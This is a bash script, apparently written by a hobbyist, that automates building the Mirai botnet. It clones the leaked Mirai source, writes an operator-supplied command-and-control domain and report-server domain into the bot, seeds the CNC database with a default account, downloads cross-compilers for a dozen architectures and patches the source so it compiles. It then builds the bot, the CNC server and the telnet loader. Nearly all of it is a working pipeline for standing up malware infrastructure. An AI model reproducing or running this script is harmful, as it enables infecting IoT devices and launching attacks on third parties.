#!/bin/bash

# Installing pre-requisits
sudo apt update
sudo apt upgrade
sudo apt-get install git gcc electric-fence -y
clear

read -p "Do you want to install the old golang (required)? (y/n) " answer
answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')
if [ "$answer" = "y" ]; then
    sudo wget https://golang.org/dl/go1.6.4.linux-amd64.tar.gz
    sudo tar -C /usr/local -xzf go1.6.4.linux-amd64.tar.gz
    sudo rm go1.6.4.linux-amd64.tar.gz
    mkdir ~/go
    echo "export GOPATH=\$HOME/go" >> ~/.bashrc
    echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.bashrc
    source ~/.bashrc

    go get github.com/go-sql-driver/mysql
    cd $GOPATH/src/github.com/go-sql-driver/mysql
    git checkout v1.3.0

    go get github.com/mattn/go-shellwords
    cd $GOPATH/src/github.com/mattn/go-shellwords
    git checkout v1.0.1
    clear
fi
clear

read -p "Do you want to install MySQL? (y/n) " answer
answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')
if [ "$answer" = "y" ]; then
    sudo apt-get install mysql-server mysql-client -y
    sudo systemctl start mysql.service
    clear
    echo -e "\t\tATENTION\nNow you need to create a root user to access MySQL.\nType the following command to set your user name and password:\n\nUPDATE user SET plugin='mysql_native_password' WHERE User='root';\nFLUSH PRIVILEGES;\nALTER USER root@localhost IDENTIFIED BY 'password';\n"
    read -p "Press any key to continue..."
    clear
    sudo mysql -u root mysql
    sudo mysql_secure_installation
    if [ $? -eq 0 ]; then
        echo "Installation successful"
    else
        echo "Installation error, closing.."
        exit
    fi
fi
clear

# Cloning source code
git clone https://github.com/jgamblin/Mirai-Source-Code 
cd Mirai-Source-Code
clear

# Configure Bot
cd mirai/tools
gcc enc.c -o enc

read -p "Insert your CNC Server Domain: " CNC
cncd=$(./enc string $CNC | awk 'NR==2')
cd ../bot
cncd_string=$(printf '%s' "$cncd" | sed 's/[\/&]/\\&/g; s/"/\\"/g')
awk -v var="$cncd_string" 'NR==18 {$0="    add_entry(TABLE_CNC_DOMAIN, \"" var "\", 30); // cnc.changeme.com"} {print}' table.c > temp.c && mv temp.c table.c

cd ../tools
read -p "Insert your Report Server Domain: " RSD
rsdomain=$(./enc string $RSD | awk 'NR==2')
cd ../bot
rsdomain_string=$(printf '%s' "$rsdomain" | sed 's/[\/&]/\\&/g; s/"/\\"/g')
awk -v var="$rsdomain_string" 'NR==21 {$0="    add_entry(TABLE_SCAN_CB_DOMAIN, \"" var "\", 29); // report.changeme.com"} {print}' table.c > temp.c && mv temp.c table.c
clear

awk 'NR==158 {$0="// #ifndef DEBUG"} NR==162 {$0="// #endif"} {print}' main.c > temp.c && mv temp.c main.c
cd ../..
echo "BOT IS NOW CONFIGURED"
sleep 1.5
clear

# Configure CNC
cd scripts
awk 'NR==2 {$0="use mirai;"} NR==29 {$0="INSERT INTO users VALUES (NULL, '\''mirai-user'\'', '\''mirai-pass'\'', 0, 0, 0, 0, -1, 1, 30, '\'''\'');"} {print}' db.sql > temp.sql && mv temp.sql db.sql

sudo service mysql start
read -p "Insert your mysql user: " user
read -s -p "Insert your mysql password: " password
clear

temp_file=$(mktemp)
chmod 600 "$temp_file"
echo "[client]" > "$temp_file"
echo "user=$user" >> "$temp_file"
echo "password=$password" >> "$temp_file"

mysql --defaults-extra-file="$temp_file" < db.sql && echo "User added to mysql mirai database (user: mirai-user, password: mirai-pass)"
rm "$temp_file"
read -n 1 -s -p "Press any key to continue..."
clear

cd ../mirai/cnc
awk -v user="$user" -v pass="$password" 'NR==10 {$0="const DatabaseAddr string   = \"127.0.0.1\";"} NR==11 {$0="const DatabaseUser string   = \"" user "\";"} NR==12 {$0="const DatabasePass string   = \"" pass "\";"} NR==13 {$0="const DatabaseTable string  = \"mirai\";"} {print}' main.go > temp.go && mv temp.go main.go
cd ../..

echo "CNC SERVER IS NOW CONFIGURED"
sleep 1.5
clear

# Configure Cross-Compilers
read -p "Do you want to set cross-compiler (required)? (y/n) " answer
answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')
if [ "$answer" = "y" ]; then
    sudo mkdir /etc/xcompile
    cd /etc/xcompile
    
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv4l.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv5l.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv6l.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-i586.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-i686.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-m68k.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-mips.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-mipsel.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-powerpc.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-sh4.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-sparc.tar.gz
    sudo wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-x86_64.tar.gz

    sudo tar -zxf cross-compiler-armv4l.tar.gz
    sudo tar -zxf cross-compiler-armv5l.tar.gz
    sudo tar -zxf cross-compiler-armv6l.tar.gz
    sudo tar -zxf cross-compiler-i586.tar.gz
    sudo tar -zxf cross-compiler-i686.tar.gz
    sudo tar -zxf cross-compiler-m68k.tar.gz
    sudo tar -zxf cross-compiler-mips.tar.gz
    sudo tar -zxf cross-compiler-mipsel.tar.gz
    sudo tar -zxf cross-compiler-powerpc.tar.gz
    sudo tar -zxf cross-compiler-sh4.tar.gz
    sudo tar -zxf cross-compiler-sparc.tar.gz
    sudo tar -zxf cross-compiler-x86_64.tar.gz
    sudo rm *.tar.gz
    clear

    echo "Moving files..."
    sudo mv cross-compiler-armv4l armv4l
    sudo mv cross-compiler-armv5l armv5l
    sudo mv cross-compiler-armv6l armv6l
    sudo mv cross-compiler-i586 i586
    sudo mv cross-compiler-i686 i686
    sudo mv cross-compiler-m68k m68k
    sudo mv cross-compiler-mips mips
    sudo mv cross-compiler-mipsel mipsel
    sudo mv cross-compiler-powerpc powerpc
    sudo mv cross-compiler-sh4 sh4
    sudo mv cross-compiler-sparc sparc
    sudo mv cross-compiler-x86_64 x86_64
    clear

    echo "Adding path variables in ~/.bashrc"
    echo " " >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/armv4l/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/armv5l/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/armv6l/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/i586/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/m68k/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/mips/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/mipsel/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/powerpc/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/powerpc-440fp/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/sh4/bin" >> ~/.bashrc
    echo "export PATH=\$PATH:/etc/xcompile/sparc/bin" >> ~/.bashrc
    cd -
    source ~/.bashrc
    
    echo "CROSS-COMPILER IS NOW CONFIGURED"
    sleep 1.5
fi
clear

cd mirai/bot
awk 'NR==31 {$0="extern ipv4_t LOCAL_ADDR;"} {print}' includes.h > temp.h && mv temp.h includes.h
awk 'NR==26 {$0="ipv4_t LOCAL_ADDR;"} {print}' main.c > temp.c && mv temp.c main.c

cd ..
awk 'NR==2 {$0="mkdir -p debug"} {print}' build.sh > temp.sh && mv temp.sh build.sh
chmod +x build.sh
./build.sh debug telnet
./build.sh release telnet

cd ../loader/src
awk 'NR==7 {$0="#include <stdbool.h>"} NR==19 {$0="        return FALSE;"} {print}' binary.c > temp.c && mv temp.c binary.c
awk 'NR==7 {print "#include <arpa/inet.h>"; print "#include <unistd.h>"; next} 1' telnet_info.c > temp.c && mv temp.c telnet_info.c
awk 'NR==11 {print "#include <ctype.h>"; print "#include <stdlib.h>"; print "#include <unistd.h>"; next} 1' util.c > temp.c && mv temp.c util.c
awk 'NR==12 {print "#include <arpa/inet.h>"; print "#include <unistd.h>"; next} 1' connection.c > temp.c && mv temp.c connection.c
awk 'NR==14 {print "#include <unistd.h>"; print "#include <arpa/inet.h>"; next} 1'  main.c > temp.c && mv temp.c main.c
awk 'NR==18 {$0="#include <unistd.h>"} {print}' server.c > temp.c && mv temp.c server.c

cd ..
chmod +x build.sh
./build.sh

clear
echo "MIRAI COMPILED"

# Vitor Silva Reis